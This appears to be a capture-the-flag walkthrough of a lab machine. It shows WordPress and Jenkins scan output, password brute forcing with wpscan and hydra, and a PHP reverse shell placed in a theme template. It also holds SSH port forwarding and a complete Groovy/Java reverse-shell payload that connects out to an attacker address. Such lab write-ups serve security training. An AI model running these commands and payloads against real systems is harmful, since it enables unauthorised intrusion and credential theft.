 | Location: http://10.10.217.97/wordpress/wp-content/themes/twentynineteen/
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://10.10.217.97/wordpress/wp-content/themes/twentynineteen/readme.txt
 | [!] The version is out of date, the latest version is 3.1
 | Style URL: http://10.10.217.97/wordpress/wp-content/themes/twentynineteen/style.css
 | Style Name: Twenty Nineteen
 | Style URI: https://wordpress.org/themes/twentynineteen/
 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.217.97/wordpress/wp-content/themes/twentynineteen/, status: 500
 |
 | Version: 1.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.217.97/wordpress/wp-content/themes/twentynineteen/style.css, Match: 'Version: 1.5'

[+] twentyseventeen
 | Location: http://10.10.217.97/wordpress/wp-content/themes/twentyseventeen/
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://10.10.217.97/wordpress/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 3.9
 | Style URL: http://10.10.217.97/wordpress/wp-content/themes/twentyseventeen/style.css
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.217.97/wordpress/wp-content/themes/twentyseventeen/, status: 500
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.217.97/wordpress/wp-content/themes/twentyseventeen/style.css, Match: 'Version: 2.3'

[+] twentytwenty
 | Location: http://10.10.217.97/wordpress/wp-content/themes/twentytwenty/
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://10.10.217.97/wordpress/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 2.9
 | Style URL: http://10.10.217.97/wordpress/wp-content/themes/twentytwenty/style.css
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.217.97/wordpress/wp-content/themes/twentytwenty/, status: 500
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.217.97/wordpress/wp-content/themes/twentytwenty/style.css, Match: 'Version: 1.2'

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue May  6 17:25:15 2025
[+] Requests Done: 454
[+] Cached Requests: 10
[+] Data Sent: 105.779 KB
[+] Data Received: 22.648 MB
[+] Memory used: 204.113 MB
[+] Elapsed time: 00:00:18

notable that it says wordpress version 5.4.2 (looked up has nothing good) it also shows a http://10.10.217.97/wordpress/wp-content/themes/twentyseventeen/style.css directory

nikto found this:
+ /wordpress/wp-login.php?action=register: Cookie wordpress_test_cookie created without the httponly flag. See: developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
through manual enumeration we see an admin account exists on the login page

┌──(root㉿kali)-[/home/kali]
└─# wpscan --url http://10.10.140.182/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 50
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.140.182/blog/ [10.10.140.182]
[+] Started: Tue May  6 21:10:50 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.140.182/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.140.182/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.140.182/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.140.182/blog/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.4.2'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.140.182/blog/, Match: 'WordPress 5.4.2'

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:06 <=============================================================================> (137 / 137) 100.00% Time: 00:00:06

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - admin / my2boys                                                                                                                                 
Trying admin / kambal Time: 00:01:01 <                                                                             > (3900 / 14348292)  0.02%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: admin, Password: my2boys

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue May  6 21:12:08 2025
[+] Requests Done: 4067
[+] Cached Requests: 4
[+] Data Sent: 2.056 MB
[+] Data Received: 2.491 MB
[+] Memory used: 265.516 MB
[+] Elapsed time: 00:01:17

Current administration email: **admin@internal.thm**

i hit this email is correct when asked to verify email http://internal.thm/blog/wp-admin/index.php btw the credentials admin my2boys worked

when I logged in i tried uploading pentest monkey's reverse shell to a custom plugin, failed

when looking up exploitations I saw ways of sanitizing payloads with % after the file extension (like in burpsuite) which I tried and didn't work so I tried one that exploits theme editors which run .php files and you can edit them in the browser. So I changed the 404 template to the pentest monkey reverse shell and then moved to the archive.php to find the comment telling me where the link is to the theme pages. Which told me @link https://developer.wordpress.org/themes/basics/template-hierarchy/ was the template for displaying archive pages which I dont think is actually what I want then I remembered wordpress scan has already enumerated the twentyseventeen directories so we have http://10.10.217.97/wordpress/wp-content/themes/twentytwenty/ and the file 404.php after fiddling with trying to get a shell to pop I got it to pop

I see in the home folder a user named aubreanna it let me cat etc/passwd 

$ cat etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
aubreanna:x:1000:1000:aubreanna:/home/aubreanna:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
$ 

and there we see aurbreanna unfortunately we cant cat etc/shadow her being in the 1000s tells me its a created user I also found out from etc/group that aubreanna was an admin

by snooping in the syswide I did crontab -l to see if there was anything local, no so I checked system wide crontab. there was a cronjob called passwd in cron.daily so I opened it:

$ cat /etc/cron.daily/passwd
#!/bin/sh

cd /var/backups || exit 0

for FILE in passwd group shadow gshadow; do
        test -f /etc/$FILE              || continue
        cmp -s $FILE.bak /etc/$FILE     && continue
        cp -p /etc/$FILE $FILE.bak && chmod 600 $FILE.bak
done
$ ls /var/backups
alternatives.tar.0
apt.extended_states.0
apt.extended_states.1.gz
dpkg.diversions.0
dpkg.statoverride.0
dpkg.status.0
group.bak
gshadow.bak
passwd.bak
shadow.bak
$  

unfortunately I am not allowed to read /var/backups only root has read perms after digging around I find a text file in /opt

$ cat /opt/wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
$ 
we now have aubreanna's password so we login with her SSH credentials

Last login: Mon Aug  3 19:56:19 2020 from 10.6.2.56
aubreanna@internal:~$ ls
jenkins.txt  snap  user.txt
aubreanna@internal:~$ cat user.txt
THM{int3rna1_fl4g_1}
aubreanna@internal:~$ cat jenkins.txt
Internal Jenkins service is running on 172.17.0.2:8080
aubreanna@internal:~$ 

and get the user flag and info about a jenkins server, problem is that its on a different internal network so I have to pivot. I did something similar in so by setting the local and remote ports for a port forwarded ssh tunnel we can logon to 172.17.0.2 
┌──(kali㉿kali)-[~]
└─$ ssh -L 8080:172.17.0.2:8080 aubreanna@10.10.5.22
and then open a web browser on 127.0.0.1:8080 and I get the jenkins interface none of the default credentials work and I didn't see anything else about the jenkins server


┌──(kali㉿kali)-[~]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 8080 http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:F=Invalid username or password"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-08 20:03:03
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://127.0.0.1:8080/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:F=Invalid username or password
[8080][http-post-form] host: 127.0.0.1   login: admin   password: spongebob
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-08 20:04:11

String host="10.23.80.154";
int port=8044;
String cmd="/bin/sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

So jenkins has a groovy script console so I found this reverse shell on github and stumbled upon the root credentials but I can't sudo su to just login as root it says I can only login as terminal 


ls opt
note.txt
cat opt/note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123
sudo su

huh I wonder how we can get in as terminal

┌──(root㉿kali)-[/home/kali]
└─# ssh root@10.10.13.105                              
root@10.10.13.105's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Mon Aug  3 19:59:17 2020 from 10.6.2.56
root@internal:~# ls
root.txt  snap
root@internal:~# cat root.txt
THM{d0ck3r_d3str0y3r}
